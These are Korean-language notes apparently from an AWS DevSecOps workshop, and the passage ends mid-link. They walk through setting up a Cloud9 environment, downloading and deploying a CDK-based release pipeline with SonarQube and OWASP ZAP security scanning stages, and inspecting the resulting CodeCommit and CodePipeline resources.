- SAST
	- codeguru, sonaqube, snyk
- SCA
- 라이선스 확인
- DAST
	- OWASP ZAP
![](images/Pasted%20image%2020230419131327.png)

- Cloud9 을 이용하여 개발환경을 이용한다.

# 1. 시작하기

이 워크샵의 첫 번째 모듈에 오신 것을 환영합니다! 이 모듈에는 워크샵 전체에서 사용할 원격 개발자 환경을 설정하는 것이 포함되어 있습니다. 개발자 환경에는 지정된 시간 내에 실습을 시작하고 실행하는 데 필요한 모든 소프트웨어, 네트워크 액세스 및 권한이 포함되어 있습니다.

이 워크샵의 주요 목표는 로컬 머신을 설정하는 것이 아니라 각 모듈의 내용을 배우는 것이기 때문에 Cloud9을 이용하여 워크샵을 진행하도록 구성되었습니다. 또한, Cloud9 을 사용하면 워크샵을 진행하는 동안 다른 참여자와 동일한 일관된 환경을 제공 받을 수 있습니다.

### Topics Covered

이 단계을 마치면 다음을 수행하실 수 있습니다.

-   [AWS Cloud 9](https://aws.amazon.com/cloud9/) 를 사용하여 원격 개발자 환경 프로비저닝

### 개발 환경

원격 개발자 환경은 워크샵에 필요한 다음 필수 소프트웨어가 사전 설치된 [AWS Cloud 9](https://aws.amazon.com/cloud9/) 를 기반으로 합니다.

-   [AWS CLI](https://aws.amazon.com/cli/) 
-   [AWS CDK](https://aws.amazon.com/cdk/) 
-   [Git](https://git-scm.com/)

# \[옵션: 2] 자신의 AWS 계정 사용


#### 주의사항

이 워크샵에서 제공될 자산 중 일부는 _의도된 취약점_으로 설계되었습니다. 이러한 자산은 _교육 목적_으로만 사용되므로 **주의하여 사용**하십시오. 자신의 AWS 계정을 사용하여 이 워크샵을 실행하려는 경우 배포된 AWS 리소스를 정리할 때까지 비용이 발생한다는 점에 유의하십시오. 워크샵 환경을 정리하기 위한 가이드는 [여기](https://catalog.us-east-1.prod.workshops.aws/event/dashboard/ko-KR/workshop/module9)에 문서화되어 있습니다.

AWS와의 초기 상호 작용은 AWS 계정 및 그 안의 리소스에 대한 웹 기반 창인 [AWS 콘솔](https://console.aws.amazon.com/) 을 통해 이루어집니다.

# 개발 환경 설정

### AWS Cloud9 셋업

이전에 언급한 것처럼 이 워크샵에 필요한 모든 소프트웨어가 이미 사전 설치되어 있으므로 [AWS Cloud9](https://aws.amazon.com/cloud9/) 를 이 워크샵의 개발 환경으로 사용하는 것이 이상적입니다.

1.  AWS 콘솔 검색창에 **Cloud9**를 입력하고 **Create Environment**을 클릭합니다.

![Cloud9 Dashboard](https://static.us-east-1.prod.workshops.aws/c59761ac-466d-4102-893e-31a4156ac76d/static/images/cloud9-dashboard.png?Key-Pair-Id=K36Q2WVO3JP7QD&Policy=eyJTdGF0ZW1lbnQiOlt7IlJlc291cmNlIjoiaHR0cHM6Ly9zdGF0aWMudXMtZWFzdC0xLnByb2Qud29ya3Nob3BzLmF3cy9jNTk3NjFhYy00NjZkLTQxMDItODkzZS0zMWE0MTU2YWM3NmQvKiIsIkNvbmRpdGlvbiI6eyJEYXRlTGVzc1RoYW4iOnsiQVdTOkVwb2NoVGltZSI6MTY4MjQ4NDM0MH19fV19&Signature=hQd8PudF0O02SgJwp9j3OLuJRGqbiBdASiRToJWFJRLtcqZndWVX6tPliAWSDMtlbWzXvMzppzNATLZTD5j%7EfKbB%7Eqv6M4K8-0wwhbuaxQlsO77kETVf9SIUX-XVeYFnAqoVfF-NmGeR%7EbaDOOQUt6lCHnvie5KhleI2bJP33wc-1qVmR4sWEQN1i1T3oAEfMXDzondL6CNDcD5kpFqGI30djqNreXrMcBJTj4TCb2s1ZgKAJXaZ4vk8AzBQI2KZQQ5IWxHRsU2x9POlLy%7EdU4e2mK2q%7EQLjfh3gew%7E7%7EJu8cdoUdsWl7Qo29pOz4wo6yvYZGgI0UnRFeyTQzsimpQ__)

2.  1단계에서 환경에 대한 **Name** 및 **Description**을 입력하고 **Next Step**를 클릭합니다.

![Cloud9 Dashboard](https://static.us-east-1.prod.workshops.aws/c59761ac-466d-4102-893e-31a4156ac76d/static/images/cloud9-step1.png?Key-Pair-Id=K36Q2WVO3JP7QD&Policy=eyJTdGF0ZW1lbnQiOlt7IlJlc291cmNlIjoiaHR0cHM6Ly9zdGF0aWMudXMtZWFzdC0xLnByb2Qud29ya3Nob3BzLmF3cy9jNTk3NjFhYy00NjZkLTQxMDItODkzZS0zMWE0MTU2YWM3NmQvKiIsIkNvbmRpdGlvbiI6eyJEYXRlTGVzc1RoYW4iOnsiQVdTOkVwb2NoVGltZSI6MTY4MjQ4NDM0MH19fV19&Signature=hQd8PudF0O02SgJwp9j3OLuJRGqbiBdASiRToJWFJRLtcqZndWVX6tPliAWSDMtlbWzXvMzppzNATLZTD5j%7EfKbB%7Eqv6M4K8-0wwhbuaxQlsO77kETVf9SIUX-XVeYFnAqoVfF-NmGeR%7EbaDOOQUt6lCHnvie5KhleI2bJP33wc-1qVmR4sWEQN1i1T3oAEfMXDzondL6CNDcD5kpFqGI30djqNreXrMcBJTj4TCb2s1ZgKAJXaZ4vk8AzBQI2KZQQ5IWxHRsU2x9POlLy%7EdU4e2mK2q%7EQLjfh3gew%7E7%7EJu8cdoUdsWl7Qo29pOz4wo6yvYZGgI0UnRFeyTQzsimpQ__)

3.  2단계에서는 웹 브라우저를 통해서만 Cloud9 환경에 액세스하면 되므로 환경 유형에서 **Create a new no-ingress EC2 instance for environment(access via Systems Manager)**을 선택합니다. 기본적으로 2단계의 다른 설정들은 기본값을 유지하고 **Next Step**를 클릭합니다.

![Cloud9 Dashboard](https://static.us-east-1.prod.workshops.aws/c59761ac-466d-4102-893e-31a4156ac76d/static/images/cloud9-step2.png?Key-Pair-Id=K36Q2WVO3JP7QD&Policy=eyJTdGF0ZW1lbnQiOlt7IlJlc291cmNlIjoiaHR0cHM6Ly9zdGF0aWMudXMtZWFzdC0xLnByb2Qud29ya3Nob3BzLmF3cy9jNTk3NjFhYy00NjZkLTQxMDItODkzZS0zMWE0MTU2YWM3NmQvKiIsIkNvbmRpdGlvbiI6eyJEYXRlTGVzc1RoYW4iOnsiQVdTOkVwb2NoVGltZSI6MTY4MjQ4NDM0MH19fV19&Signature=hQd8PudF0O02SgJwp9j3OLuJRGqbiBdASiRToJWFJRLtcqZndWVX6tPliAWSDMtlbWzXvMzppzNATLZTD5j%7EfKbB%7Eqv6M4K8-0wwhbuaxQlsO77kETVf9SIUX-XVeYFnAqoVfF-NmGeR%7EbaDOOQUt6lCHnvie5KhleI2bJP33wc-1qVmR4sWEQN1i1T3oAEfMXDzondL6CNDcD5kpFqGI30djqNreXrMcBJTj4TCb2s1ZgKAJXaZ4vk8AzBQI2KZQQ5IWxHRsU2x9POlLy%7EdU4e2mK2q%7EQLjfh3gew%7E7%7EJu8cdoUdsWl7Qo29pOz4wo6yvYZGgI0UnRFeyTQzsimpQ__)

4.  3단계에서는 환경 설정만 검토하면 됩니다. 다음 값이 아래와 같이 설정한 것과 동일한지 확인한 다음 **Create Environment**를 클릭하세요.

![Cloud9 Dashboard](https://static.us-east-1.prod.workshops.aws/c59761ac-466d-4102-893e-31a4156ac76d/static/images/cloud9-step3.png?Key-Pair-Id=K36Q2WVO3JP7QD&Policy=eyJTdGF0ZW1lbnQiOlt7IlJlc291cmNlIjoiaHR0cHM6Ly9zdGF0aWMudXMtZWFzdC0xLnByb2Qud29ya3Nob3BzLmF3cy9jNTk3NjFhYy00NjZkLTQxMDItODkzZS0zMWE0MTU2YWM3NmQvKiIsIkNvbmRpdGlvbiI6eyJEYXRlTGVzc1RoYW4iOnsiQVdTOkVwb2NoVGltZSI6MTY4MjQ4NDM0MH19fV19&Signature=hQd8PudF0O02SgJwp9j3OLuJRGqbiBdASiRToJWFJRLtcqZndWVX6tPliAWSDMtlbWzXvMzppzNATLZTD5j%7EfKbB%7Eqv6M4K8-0wwhbuaxQlsO77kETVf9SIUX-XVeYFnAqoVfF-NmGeR%7EbaDOOQUt6lCHnvie5KhleI2bJP33wc-1qVmR4sWEQN1i1T3oAEfMXDzondL6CNDcD5kpFqGI30djqNreXrMcBJTj4TCb2s1ZgKAJXaZ4vk8AzBQI2KZQQ5IWxHRsU2x9POlLy%7EdU4e2mK2q%7EQLjfh3gew%7E7%7EJu8cdoUdsWl7Qo29pOz4wo6yvYZGgI0UnRFeyTQzsimpQ__)

5.  정상적인 경우 몇 분 후 Cloud9이 실행되고 워크샵 진행을 위한 준비가 완료됩니다.

![Cloud9 Dashboard](https://static.us-east-1.prod.workshops.aws/c59761ac-466d-4102-893e-31a4156ac76d/static/images/cloud9-ide.png?Key-Pair-Id=K36Q2WVO3JP7QD&Policy=eyJTdGF0ZW1lbnQiOlt7IlJlc291cmNlIjoiaHR0cHM6Ly9zdGF0aWMudXMtZWFzdC0xLnByb2Qud29ya3Nob3BzLmF3cy9jNTk3NjFhYy00NjZkLTQxMDItODkzZS0zMWE0MTU2YWM3NmQvKiIsIkNvbmRpdGlvbiI6eyJEYXRlTGVzc1RoYW4iOnsiQVdTOkVwb2NoVGltZSI6MTY4MjQ4NDM0MH19fV19&Signature=hQd8PudF0O02SgJwp9j3OLuJRGqbiBdASiRToJWFJRLtcqZndWVX6tPliAWSDMtlbWzXvMzppzNATLZTD5j%7EfKbB%7Eqv6M4K8-0wwhbuaxQlsO77kETVf9SIUX-XVeYFnAqoVfF-NmGeR%7EbaDOOQUt6lCHnvie5KhleI2bJP33wc-1qVmR4sWEQN1i1T3oAEfMXDzondL6CNDcD5kpFqGI30djqNreXrMcBJTj4TCb2s1ZgKAJXaZ4vk8AzBQI2KZQQ5IWxHRsU2x9POlLy%7EdU4e2mK2q%7EQLjfh3gew%7E7%7EJu8cdoUdsWl7Qo29pOz4wo6yvYZGgI0UnRFeyTQzsimpQ__)

# 2. 릴리스 자동화

이 실습에서는 릴리스 파이프라인을 설정합니다. 파이프라인의 초기 아키텍처는 다음과 같은 AWS 서비스를 사용합니다.

![Pipeline Part 1](https://static.us-east-1.prod.workshops.aws/c59761ac-466d-4102-893e-31a4156ac76d/static/images/pipeline-part1.png?Key-Pair-Id=K36Q2WVO3JP7QD&Policy=eyJTdGF0ZW1lbnQiOlt7IlJlc291cmNlIjoiaHR0cHM6Ly9zdGF0aWMudXMtZWFzdC0xLnByb2Qud29ya3Nob3BzLmF3cy9jNTk3NjFhYy00NjZkLTQxMDItODkzZS0zMWE0MTU2YWM3NmQvKiIsIkNvbmRpdGlvbiI6eyJEYXRlTGVzc1RoYW4iOnsiQVdTOkVwb2NoVGltZSI6MTY4MjQ2OTkwNX19fV19&Signature=ZJYZz-9kUJm%7EYm5NnsrMXtSqZ1YurZ74ndP1O%7EJ257obz0Z9r%7ETYFHTn00bQ4zqrL4SxS4x%7Ebh3EpNjLPucAvVuqyJMayrrmxPkfHjeWun8e%7ESzVs6gK5kMdWfoeULEFtvpbH%7EW8gxA8c1skZn9MWERGfO0RgC9xvKcTa7W1Y5%7EscGIPGFMlmCD79fMxEGhtrZb-nBVdahFWB4WOOd7kh9w6ShlicWpc8sG7fA71TVn-%7EIl0qNcsuvpzlr4nK6gIScNkQd35WVWRge-RSnx0RqfqgPPYEIdavK5CuJVezr%7Eqs1Cwk8sCj-YtLu-eahtSraH51ceKOcLJXJuDiXpcSg__)

-   **[AWS CodeCommit](https://aws.amazon.com/codecommit/)**  - Git 레포지토리
-   **[AWS CodeBuild](https://aws.amazon.com/codebuild/)**  - 웹 애플리케이션에서 컨테이너를 빌드하고 이를 Private Container Registry에 게시하는 통합 서비스
-   **[Amazon ECR](https://aws.amazon.com/ecr/)**  - Private Container Registry
-   **[AWS CodePipeline](https://aws.amazon.com/codepipeline/)**  - 릴리스 파이프라인을 오케스트레이션 할 지속적 배포 서비스
-   **[Amazon ECS on Fargate](https://aws.amazon.com/fargate)**  - 웹 애플리케이션을 배포할 컴퓨팅 리소스

실습을 진행하면서 다른 "Security-focused" 빌드 단계를 천천히 소개하도록 하겠습니다.

#### Topics Covered

이 실습을 마치면 다음을 수행할 수 있습니다.

-   AWS Cloud9 환경을 사용하여 AWS CDK 기반으로 AWS 리소스 배포
-   릴리스 파이프라인 구축에 필요한 AWS 서비스 프로비저닝

# 프로젝트 파일 다운로드

이 워크숍의 릴리스 파이프라인에 필요한 모든 리소스는 [AWS CDK](https://aws.amazon.com/cdk/) 에 정의되어 있습니다.

이 작업에서는 파이프라인 코드를 Cloud9 환경으로 다운로드합니다.

1.  AWS Cloud9으로 이동하여 터미널 창으로 이동한 다음 아래의 명령을 붙여넣어 파이프라인 코드를 다운로드합니다.

```bash
curl 'https://static.us-east-1.prod.workshops.aws/c59761ac-466d-4102-893e-31a4156ac76d/assets/pipeline.zip?Key-Pair-Id=K36Q2WVO3JP7QD&Policy=eyJTdGF0ZW1lbnQiOlt7IlJlc291cmNlIjoiaHR0cHM6Ly9zdGF0aWMudXMtZWFzdC0xLnByb2Qud29ya3Nob3BzLmF3cy9jNTk3NjFhYy00NjZkLTQxMDItODkzZS0zMWE0MTU2YWM3NmQvKiIsIkNvbmRpdGlvbiI6eyJEYXRlTGVzc1RoYW4iOnsiQVdTOkVwb2NoVGltZSI6MTY4MjQ2OTkwNX19fV19&Signature=ZJYZz-9kUJm~Ym5NnsrMXtSqZ1YurZ74ndP1O~J257obz0Z9r~TYFHTn00bQ4zqrL4SxS4x~bh3EpNjLPucAvVuqyJMayrrmxPkfHjeWun8e~SzVs6gK5kMdWfoeULEFtvpbH~W8gxA8c1skZn9MWERGfO0RgC9xvKcTa7W1Y5~scGIPGFMlmCD79fMxEGhtrZb-nBVdahFWB4WOOd7kh9w6ShlicWpc8sG7fA71TVn-~Il0qNcsuvpzlr4nK6gIScNkQd35WVWRge-RSnx0RqfqgPPYEIdavK5CuJVezr~qs1Cwk8sCj-YtLu-eahtSraH51ceKOcLJXJuDiXpcSg__' --output pipeline.zip

unzip pipeline.zip -d pipeline && rm pipeline.zip
```

2.  릴리스 자동화를 위한 CDK 구성이 포함된 **pipeline**이라는 새 폴더가 있어야합니다. 다음 섹션으로 넘어가 우리 환경에 배포해 보겠습니다.

![unzip](https://static.us-east-1.prod.workshops.aws/c59761ac-466d-4102-893e-31a4156ac76d/static/images/unzip.png?Key-Pair-Id=K36Q2WVO3JP7QD&Policy=eyJTdGF0ZW1lbnQiOlt7IlJlc291cmNlIjoiaHR0cHM6Ly9zdGF0aWMudXMtZWFzdC0xLnByb2Qud29ya3Nob3BzLmF3cy9jNTk3NjFhYy00NjZkLTQxMDItODkzZS0zMWE0MTU2YWM3NmQvKiIsIkNvbmRpdGlvbiI6eyJEYXRlTGVzc1RoYW4iOnsiQVdTOkVwb2NoVGltZSI6MTY4MjQ2OTkwNX19fV19&Signature=ZJYZz-9kUJm%7EYm5NnsrMXtSqZ1YurZ74ndP1O%7EJ257obz0Z9r%7ETYFHTn00bQ4zqrL4SxS4x%7Ebh3EpNjLPucAvVuqyJMayrrmxPkfHjeWun8e%7ESzVs6gK5kMdWfoeULEFtvpbH%7EW8gxA8c1skZn9MWERGfO0RgC9xvKcTa7W1Y5%7EscGIPGFMlmCD79fMxEGhtrZb-nBVdahFWB4WOOd7kh9w6ShlicWpc8sG7fA71TVn-%7EIl0qNcsuvpzlr4nK6gIScNkQd35WVWRge-RSnx0RqfqgPPYEIdavK5CuJVezr%7Eqs1Cwk8sCj-YtLu-eahtSraH51ceKOcLJXJuDiXpcSg__)

# AWS CDK 구성

여기에 정의된 단계는 워크샵으로 이동하기 전에 **필수**이며 **한번**만 수행하면 됩니다. 워크숍 중에 AWS 리소스를 배포하는 데 어려움이 있으면 여기를 다시 참조하십시오.

이 실습 섹션에서는 릴리스 파이프라인을 배포하기 위해 작동하는 CDK 환경을 구성합니다. 다음 단계를 먼저 살펴보신 분은 다음 단계가 **python** 프로젝트를 부트스트랩하는 것임을 알 수 있습니다. 이는 릴리스 파이프라인용 CDK 구성이 **python**으로 작성되었기 때문입니다.

1.  AWS Cloud9로 이동하여 터미널 창에 다음 명령을 입력합니다.

```bash
1
cd ~/environment/pipeline
```

2.  시스템에 설치된 python 라이브러리를 Cloud9에 그대로 유지하기 위해 프로젝트 전용으로 파이썬 가상 환경을 만들도록 하겠습니다. 가상 환경을 생성하려면 Cloud9 터미널 창에 다음 명령을 입력하십시오.

```bash
1
python3 -m venv .venv
```

3.  그런 다음 가상 환경을 활성화해 보겠습니다.

```bash
1
source .venv/bin/activate
```

AWS 계정에서 로그아웃하고 AWS Cloud9를 다시 로드해야 하는 경우 이 단계를 반복하여 Python에 이 가상 환경을 사용할 것임을 명시적으로 알려야 합니다.

4.  가상 환경이 활성화되면 현재 터미널 세션이 가상 환경을 사용하고 있다는 표시가 표시되어야 합니다(shell, '.venv'의 맨 왼쪽에 표시됨). 

![venv](https://static.us-east-1.prod.workshops.aws/c59761ac-466d-4102-893e-31a4156ac76d/static/images/venv.png?Key-Pair-Id=K36Q2WVO3JP7QD&Policy=eyJTdGF0ZW1lbnQiOlt7IlJlc291cmNlIjoiaHR0cHM6Ly9zdGF0aWMudXMtZWFzdC0xLnByb2Qud29ya3Nob3BzLmF3cy9jNTk3NjFhYy00NjZkLTQxMDItODkzZS0zMWE0MTU2YWM3NmQvKiIsIkNvbmRpdGlvbiI6eyJEYXRlTGVzc1RoYW4iOnsiQVdTOkVwb2NoVGltZSI6MTY4MjQ4NDM0MH19fV19&Signature=hQd8PudF0O02SgJwp9j3OLuJRGqbiBdASiRToJWFJRLtcqZndWVX6tPliAWSDMtlbWzXvMzppzNATLZTD5j%7EfKbB%7Eqv6M4K8-0wwhbuaxQlsO77kETVf9SIUX-XVeYFnAqoVfF-NmGeR%7EbaDOOQUt6lCHnvie5KhleI2bJP33wc-1qVmR4sWEQN1i1T3oAEfMXDzondL6CNDcD5kpFqGI30djqNreXrMcBJTj4TCb2s1ZgKAJXaZ4vk8AzBQI2KZQQ5IWxHRsU2x9POlLy%7EdU4e2mK2q%7EQLjfh3gew%7E7%7EJu8cdoUdsWl7Qo29pOz4wo6yvYZGgI0UnRFeyTQzsimpQ__)

5.  다음으로 이 명령을 사용하여 필요한 라이브러리를 설치하겠습니다.

```
pip install -r requirements.txt
```

이제 릴리스 파이프라인을 배포할 준비가 되었습니다. 다음 섹션을 진행하십시오.

# 파이프라인 및 도구 배포

이제 작동하는 CDK 환경이 준비되었으니 릴리스 파이프라인을 배포할 수 있습니다. 또한 **SAST 도구**인 **SonarQube 서버**와 향후 모듈에서 사용할 **DAST 도구**인 **OWASP Zap Proxy**를 CDK 를 이용하여 배포하도록 하겠습니다. 초기 릴리스 파이프라인은 다음과 같습니다.

![Pipeline Part 1](https://static.us-east-1.prod.workshops.aws/c59761ac-466d-4102-893e-31a4156ac76d/static/images/pipeline-part1.png?Key-Pair-Id=K36Q2WVO3JP7QD&Policy=eyJTdGF0ZW1lbnQiOlt7IlJlc291cmNlIjoiaHR0cHM6Ly9zdGF0aWMudXMtZWFzdC0xLnByb2Qud29ya3Nob3BzLmF3cy9jNTk3NjFhYy00NjZkLTQxMDItODkzZS0zMWE0MTU2YWM3NmQvKiIsIkNvbmRpdGlvbiI6eyJEYXRlTGVzc1RoYW4iOnsiQVdTOkVwb2NoVGltZSI6MTY4MjQ4NDM0MH19fV19&Signature=hQd8PudF0O02SgJwp9j3OLuJRGqbiBdASiRToJWFJRLtcqZndWVX6tPliAWSDMtlbWzXvMzppzNATLZTD5j%7EfKbB%7Eqv6M4K8-0wwhbuaxQlsO77kETVf9SIUX-XVeYFnAqoVfF-NmGeR%7EbaDOOQUt6lCHnvie5KhleI2bJP33wc-1qVmR4sWEQN1i1T3oAEfMXDzondL6CNDcD5kpFqGI30djqNreXrMcBJTj4TCb2s1ZgKAJXaZ4vk8AzBQI2KZQQ5IWxHRsU2x9POlLy%7EdU4e2mK2q%7EQLjfh3gew%7E7%7EJu8cdoUdsWl7Qo29pOz4wo6yvYZGgI0UnRFeyTQzsimpQ__)

1.  AWS Cloud9의 터미널 창으로 돌아가 **pipeline** 폴더 아래의 **config.yaml.sample**에서 **config.yaml**이라는 새 파일을 생성해 보겠습니다.

```bash
1
2
cd ~/environment/pipeline
cp config.yaml.sample config.yaml
```

2.  왼쪽에 있는 Cloud9의 Explorer를 클릭하여 새로 생성된 파일(**config.yaml**)을 엽니다.

![config-yaml](https://static.us-east-1.prod.workshops.aws/c59761ac-466d-4102-893e-31a4156ac76d/static/images/config-yaml.png?Key-Pair-Id=K36Q2WVO3JP7QD&Policy=eyJTdGF0ZW1lbnQiOlt7IlJlc291cmNlIjoiaHR0cHM6Ly9zdGF0aWMudXMtZWFzdC0xLnByb2Qud29ya3Nob3BzLmF3cy9jNTk3NjFhYy00NjZkLTQxMDItODkzZS0zMWE0MTU2YWM3NmQvKiIsIkNvbmRpdGlvbiI6eyJEYXRlTGVzc1RoYW4iOnsiQVdTOkVwb2NoVGltZSI6MTY4MjQ4NDM0MH19fV19&Signature=hQd8PudF0O02SgJwp9j3OLuJRGqbiBdASiRToJWFJRLtcqZndWVX6tPliAWSDMtlbWzXvMzppzNATLZTD5j%7EfKbB%7Eqv6M4K8-0wwhbuaxQlsO77kETVf9SIUX-XVeYFnAqoVfF-NmGeR%7EbaDOOQUt6lCHnvie5KhleI2bJP33wc-1qVmR4sWEQN1i1T3oAEfMXDzondL6CNDcD5kpFqGI30djqNreXrMcBJTj4TCb2s1ZgKAJXaZ4vk8AzBQI2KZQQ5IWxHRsU2x9POlLy%7EdU4e2mK2q%7EQLjfh3gew%7E7%7EJu8cdoUdsWl7Qo29pOz4wo6yvYZGgI0UnRFeyTQzsimpQ__)

3.  **config.yaml**은 실습과정에서 파이프라인의 특정 빌드 단계를 활성화/비활성화하는 설정 파일입니다. 현재 단계에서는 대부분 비활성화되어 있습니다(`enabled: False`로 표시됨). _이 단계에서는 이 파일을 변경하지 않습니다_. 따라서, **config.yaml**은 다음과 같아야 합니다.

```yaml
### Staging Auto-Deploy
auto_deploy_staging: False
initial_image: public.ecr.aws/adelagon/flask-app:latest

### Static Application Security Testing (SAST) Step
sast:
  enabled: True
  sonarqube:
    image: public.ecr.aws/adelagon/sonarqube:lts-community
    token: <PLACE_SONARQUBE_TOKEN_HERE>

### Software Composition Analysis (SCA) Step
sca:
  enabled: True

### License Checker Step
license:
  enabled: True

### Dynamic Application Security Testing (DAST) Step
dast:
  enabled: True
  zaproxy:
    instance_type: t3.medium
    api_key: SomeRandomString
```

4.  CDK 명령을 실행하기 전에 CDK가 배포를 수행하는 데 필요한 [리소스](https://docs.aws.amazon.com/cdk/latest/guide/bootstrapping.html) 를 프로비저닝하겠습니다. 이 작업은 한 번만 수행하면 됩니다. Cloud9 터미널 창에 다음을 입력하시기 바랍니다.

```bash
cdk bootstrap
```

5.  이제 CDK가 제대로 설치 및 구성되었는지 테스트해 보겠습니다. Cloud9의 터미널 창으로 이동하여 아래 명령을 입력합니다. 정상적인 경우 릴리스 파이프라인에 대한 CloudFormation 템플릿을 확인할 수 있어야 합니다.

```bash
cdk synth
```

6.  Cloud9의 터미널 창에서 아래 명령어로 Release Pipeline을 배포하도록 하겠습니다. 확인 창에서 **y** 를 입력하고 **Enter**를 를 눌러 계속 진행합니다.

```bash
cdk deploy --require-approval never
```

7.  CDK가 가 작업을 완료할 때까지는 몇 분의 시간이 소요됩니다. AWS 리소스가 프로비저닝되는 동안 일부 CDK 구성(**pipeline/appsec_workshop** 폴더 아래)을 살펴보겠습니다. CDK가 완료되면 아래와 같은 화면이 표시됩니다.

![venv](https://static.us-east-1.prod.workshops.aws/c59761ac-466d-4102-893e-31a4156ac76d/static/images/cdk-deploy-success.png?Key-Pair-Id=K36Q2WVO3JP7QD&Policy=eyJTdGF0ZW1lbnQiOlt7IlJlc291cmNlIjoiaHR0cHM6Ly9zdGF0aWMudXMtZWFzdC0xLnByb2Qud29ya3Nob3BzLmF3cy9jNTk3NjFhYy00NjZkLTQxMDItODkzZS0zMWE0MTU2YWM3NmQvKiIsIkNvbmRpdGlvbiI6eyJEYXRlTGVzc1RoYW4iOnsiQVdTOkVwb2NoVGltZSI6MTY4MjQ4NDM0MH19fV19&Signature=hQd8PudF0O02SgJwp9j3OLuJRGqbiBdASiRToJWFJRLtcqZndWVX6tPliAWSDMtlbWzXvMzppzNATLZTD5j%7EfKbB%7Eqv6M4K8-0wwhbuaxQlsO77kETVf9SIUX-XVeYFnAqoVfF-NmGeR%7EbaDOOQUt6lCHnvie5KhleI2bJP33wc-1qVmR4sWEQN1i1T3oAEfMXDzondL6CNDcD5kpFqGI30djqNreXrMcBJTj4TCb2s1ZgKAJXaZ4vk8AzBQI2KZQQ5IWxHRsU2x9POlLy%7EdU4e2mK2q%7EQLjfh3gew%7E7%7EJu8cdoUdsWl7Qo29pOz4wo6yvYZGgI0UnRFeyTQzsimpQ__)

다음 섹션을 진행하여 방금 배포한 내용을 살펴보시기 바랍니다.

# 환경 탐색

계속하기 전에 AWS CDK가 프로비저닝된 내용들을 살펴보도록 하겠습니다.

1.  AWS 콘솔 검색 창에 **CodeCommit**을 입력하여 AWS CodeCommit 대시보드를 열고 나중에 웹 애플리케이션 코드를 저장할 **flask-app**이라는 빈 Git 리포지토리가 생성되어 있는지 확인합니다. 또한, AWS CDK에서 개발자가 코드를 게시할 때마다 릴리스 파이프라인을 트리거하는 **CloudWatch Event Rule**을 생성하도록 했습니다.

![codecommit](https://static.us-east-1.prod.workshops.aws/c59761ac-466d-4102-893e-31a4156ac76d/static/images/codecommit.png?Key-Pair-Id=K36Q2WVO3JP7QD&Policy=eyJTdGF0ZW1lbnQiOlt7IlJlc291cmNlIjoiaHR0cHM6Ly9zdGF0aWMudXMtZWFzdC0xLnByb2Qud29ya3Nob3BzLmF3cy9jNTk3NjFhYy00NjZkLTQxMDItODkzZS0zMWE0MTU2YWM3NmQvKiIsIkNvbmRpdGlvbiI6eyJEYXRlTGVzc1RoYW4iOnsiQVdTOkVwb2NoVGltZSI6MTY4MjQ4NDM0MH19fV19&Signature=hQd8PudF0O02SgJwp9j3OLuJRGqbiBdASiRToJWFJRLtcqZndWVX6tPliAWSDMtlbWzXvMzppzNATLZTD5j%7EfKbB%7Eqv6M4K8-0wwhbuaxQlsO77kETVf9SIUX-XVeYFnAqoVfF-NmGeR%7EbaDOOQUt6lCHnvie5KhleI2bJP33wc-1qVmR4sWEQN1i1T3oAEfMXDzondL6CNDcD5kpFqGI30djqNreXrMcBJTj4TCb2s1ZgKAJXaZ4vk8AzBQI2KZQQ5IWxHRsU2x9POlLy%7EdU4e2mK2q%7EQLjfh3gew%7E7%7EJu8cdoUdsWl7Qo29pOz4wo6yvYZGgI0UnRFeyTQzsimpQ__)

2.  이제 릴리스 파이프라인을 살펴보도록 하겠습니다. 왼쪽 메뉴에서 **pipelines**을 클릭한 다음 **pipelines**을 클릭합니다. **devsecops-pipeline**이라는 새 파이프라인이 있음을 확인해야 합니다. 현재 CodeCommit 리포지토리가 비어 있으므로 실패로 표시된 가장 최근 실행 상태에 대해서는 무시하셔도 됩니다.

![codepipeline-stages](https://static.us-east-1.prod.workshops.aws/c59761ac-466d-4102-893e-31a4156ac76d/static/images/codepipeline.png?Key-Pair-Id=K36Q2WVO3JP7QD&Policy=eyJTdGF0ZW1lbnQiOlt7IlJlc291cmNlIjoiaHR0cHM6Ly9zdGF0aWMudXMtZWFzdC0xLnByb2Qud29ya3Nob3BzLmF3cy9jNTk3NjFhYy00NjZkLTQxMDItODkzZS0zMWE0MTU2YWM3NmQvKiIsIkNvbmRpdGlvbiI6eyJEYXRlTGVzc1RoYW4iOnsiQVdTOkVwb2NoVGltZSI6MTY4MjQ4NDM0MH19fV19&Signature=hQd8PudF0O02SgJwp9j3OLuJRGqbiBdASiRToJWFJRLtcqZndWVX6tPliAWSDMtlbWzXvMzppzNATLZTD5j%7EfKbB%7Eqv6M4K8-0wwhbuaxQlsO77kETVf9SIUX-XVeYFnAqoVfF-NmGeR%7EbaDOOQUt6lCHnvie5KhleI2bJP33wc-1qVmR4sWEQN1i1T3oAEfMXDzondL6CNDcD5kpFqGI30djqNreXrMcBJTj4TCb2s1ZgKAJXaZ4vk8AzBQI2KZQQ5IWxHRsU2x9POlLy%7EdU4e2mK2q%7EQLjfh3gew%7E7%7EJu8cdoUdsWl7Qo29pOz4wo6yvYZGgI0UnRFeyTQzsimpQ__)

3.  파이프라인 목록에서 **devsecops-pipeline**을 클릭하여 현재 두 단계가 있는지 확인합니다. **CheckoutSource** 단계는 CodeCommit 리포지토리에 코드가 변경될 때마다 트리거됩니다. 최신 코드를 다운로드하고 **BuildImage** 단계에서 웹 애플리케이션의 컨테이너 이미지를 생성하는 데 사용할 아티팩트를 생성합니다.

![codepipeline](https://static.us-east-1.prod.workshops.aws/c59761ac-466d-4102-893e-31a4156ac76d/static/images/codepipeline-stages.png?Key-Pair-Id=K36Q2WVO3JP7QD&Policy=eyJTdGF0ZW1lbnQiOlt7IlJlc291cmNlIjoiaHR0cHM6Ly9zdGF0aWMudXMtZWFzdC0xLnByb2Qud29ya3Nob3BzLmF3cy9jNTk3NjFhYy00NjZkLTQxMDItODkzZS0zMWE0MTU2YWM3NmQvKiIsIkNvbmRpdGlvbiI6eyJEYXRlTGVzc1RoYW4iOnsiQVdTOkVwb2NoVGltZSI6MTY4MjQ4NDM0MH19fV19&Signature=hQd8PudF0O02SgJwp9j3OLuJRGqbiBdASiRToJWFJRLtcqZndWVX6tPliAWSDMtlbWzXvMzppzNATLZTD5j%7EfKbB%7Eqv6M4K8-0wwhbuaxQlsO77kETVf9SIUX-XVeYFnAqoVfF-NmGeR%7EbaDOOQUt6lCHnvie5KhleI2bJP33wc-1qVmR4sWEQN1i1T3oAEfMXDzondL6CNDcD5kpFqGI30djqNreXrMcBJTj4TCb2s1ZgKAJXaZ4vk8AzBQI2KZQQ5IWxHRsU2x9POlLy%7EdU4e2mK2q